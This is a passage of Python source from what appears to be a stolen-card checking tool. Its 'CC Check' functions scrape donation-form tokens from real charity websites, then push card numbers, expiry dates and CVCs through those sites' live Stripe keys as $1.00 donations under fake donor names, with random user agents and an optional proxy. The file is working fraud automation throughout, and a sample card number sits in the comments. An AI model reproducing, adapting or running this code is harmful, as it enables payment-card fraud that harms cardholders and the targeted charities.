    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51rtq9zrsox2txaml3vgjuaamhfyv1iur5dogxjic6f2dwrfgxehq6sadwcls1iodervxvokirglurfnqpxthyz5v00vniqims7',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}") 
        
#============================================
# --- Main CC Check Function ---
def go13(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        response = requests.get('https://gods-dna.com/campaigns/save-water-initiative/donate/', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G13 ID Response: {form_id}")
        print(f"G13 ID Response: {donation_nonce}")
        print(f"G13 ID Response: {campaign_id}")
        print(f"G13 ID Response: {donation_id}")
        	
        #2
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': user,
        }
        
        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][country]=US&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Fgods-dna.com&time_on_page=28471&client_attribution_metadata[client_session_id]=514a366d-9ca6-4a33-928c-85702c430cbb&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51P5cEKLPKIuFJVL21f177uGwZrTmpfiNidDlHNtbaOpcXEUTmDB5ibBvKW5O37ahAyfBzuTNQ4QiAJHn3BLmmBTx00ja35XFdT'
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G13 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
            'tk_or': '%22https%3A%2F%2Fwww.google.com%2F%22',
            'tk_lr': '%22https%3A%2F%2Fwww.google.com%2F%22',
            'tk_ai': 'HVibdSc+HF3H/QFkrPiTYiXR',
            '__stripe_mid': '28300acb-8ef7-4687-b261-61418c999a5bad3f06',
            'charitable_session': '32f77a502efa2eb8a91d97ca3835b81c||86400||82800',
            'tk_r3d': '%22https%3A%2F%2Fwww.google.com%2F%22',
            '__stripe_sid': 'e45f54e9-5563-4c55-b832-2b650928c4a333fad8',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2026-01-02%2009%3A38%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fsave-water-initiative%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
            'sbjs_first_add': 'fd%3D2026-01-02%2009%3A38%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fsave-water-initiative%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
            'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
            'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fsave-water-initiative%2Fdonate%2F',
        }
        
        headers = {
            'authority': 'gods-dna.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': 'tk_or=%22https%3A%2F%2Fwww.google.com%2F%22; tk_lr=%22https%3A%2F%2Fwww.google.com%2F%22; tk_ai=HVibdSc+HF3H/QFkrPiTYiXR; __stripe_mid=28300acb-8ef7-4687-b261-61418c999a5bad3f06; charitable_session=32f77a502efa2eb8a91d97ca3835b81c||86400||82800; tk_r3d=%22https%3A%2F%2Fwww.google.com%2F%22; __stripe_sid=e45f54e9-5563-4c55-b832-2b650928c4a333fad8; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-02%2009%3A38%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fsave-water-initiative%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2026-01-02%2009%3A38%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fsave-water-initiative%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fsave-water-initiative%2Fdonate%2F',
            'origin': 'https://gods-dna.com',
            'referer': 'https://gods-dna.com/campaigns/save-water-initiative/donate/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'charitable_form_id': f'{form_id}',
            f'{form_id}': '',
            '_charitable_donation_nonce': f'{donation_nonce}',
            '_wp_http_referer': '/campaigns/save-water-initiative/donate/',
            'campaign_id': f'{campaign_id}',
            'description': 'Sierra Leone, West Africa Project',
            'ID': f'{donation_id}',
            'gateway': 'stripe',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'first_name': 'Gen',
            'last_name': 'Paypal',
            'email': email,
            'address': '',
            'address_2': '',
            'city': '',
            'state': '',
            'postcode': '',
            'country': 'US',
            'phone': '',
            'stripe_payment_method': f'{pm}',
            'action': 'make_donation',
            'form_action': 'make_donation',
        }
        
        response = requests.post('https://gods-dna.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51P5cEKLPKIuFJVL21f177uGwZrTmpfiNidDlHNtbaOpcXEUTmDB5ibBvKW5O37ahAyfBzuTNQ4QiAJHn3BLmmBTx00ja35XFdT',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}") 
        
#============================================
# --- Main CC Check Function ---
def go14(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        response = requests.get('https://run4yitzi.com/campaigns/izabennaroch/donate/', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G14 ID Response: {form_id}")
        print(f"G14 ID Response: {donation_nonce}")
        print(f"G14 ID Response: {campaign_id}")
        print(f"G14 ID Response: {donation_id}")
        	
        #2
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': user,
        }
        
        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Frun4yitzi.com&time_on_page=34596&client_attribution_metadata[client_session_id]=28d55e99-c05d-430a-8c92-27a89d8614ce&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51B6NBPJJO0cqdeICzeIjfbSS9mWmFphJtUSTDmmt83nxla4ijEQgdQJTxay8yow8GPsEqm1OSi7y0WO82waDRJD100Qy0rGkUb'
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G14 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
            'charitable_session': 'f172c8057d0422d36984dd4f12c7e7a3||86400||82800',
            '_ga_NDJN4WKJVS': 'GS2.1.s1767347483$o1$g0$t1767347483$j60$l0$h0',
            '_ga': 'GA1.2.457464258.1767347484',
            '_gid': 'GA1.2.110531386.1767347484',
            '_gat_gtag_UA_32258511_9': '1',
            '__stripe_mid': 'd0be3287-881e-45f7-8962-4c891b5fa80523afe2',
            '__stripe_sid': '81d747db-3e3e-47c3-8547-9e06b0ecc6afb0ea72',
        }
        
        headers = {
            'authority': 'run4yitzi.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': 'charitable_session=f172c8057d0422d36984dd4f12c7e7a3||86400||82800; _ga_NDJN4WKJVS=GS2.1.s1767347483$o1$g0$t1767347483$j60$l0$h0; _ga=GA1.2.457464258.1767347484; _gid=GA1.2.110531386.1767347484; _gat_gtag_UA_32258511_9=1; __stripe_mid=d0be3287-881e-45f7-8962-4c891b5fa80523afe2; __stripe_sid=81d747db-3e3e-47c3-8547-9e06b0ecc6afb0ea72',
            'origin': 'https://run4yitzi.com',
            'referer': 'https://run4yitzi.com/campaigns/izabennaroch/donate/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'charitable_form_id': f'{form_id}',
            f'{form_id}': '',
            '_charitable_donation_nonce': f'{donation_nonce}',
            '_wp_http_referer': '/campaigns/izabennaroch/donate/',
            'campaign_id': f'{campaign_id}',
            'description': 'Iza Benarroch',
            'ID': f'{donation_id}',
            'gateway': 'stripe',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'recurring_donation': 'once',
            'first_name': 'Gen',
            'last_name': 'Paypal',
            'email': email,
            'donor_comment': '',
            'stripe_payment_method': f'{pm}',
            'action': 'make_donation',
            'form_action': 'make_donation',
        }
        
        response = requests.post('https://run4yitzi.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51B6NBPJJO0cqdeICzeIjfbSS9mWmFphJtUSTDmmt83nxla4ijEQgdQJTxay8yow8GPsEqm1OSi7y0WO82waDRJD100Qy0rGkUb',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}")
#================================        
#test_card = "4441114465823639|05|2029|839"
#print(go0(test_card))
#print(go1(test_card))
#print(go2(test_card))
#print(go3(test_card))
#print(go4(test_card))
#print(go5(test_card))
#print(go6(test_card))
#print(go7(test_card))
#print(go8(test_card))
#print(go9(test_card))
#print(go10(test_card))
#print(go11(test_card))
#print(go12(test_card))
#print(go13(test_card))
#print(go14(test_card))
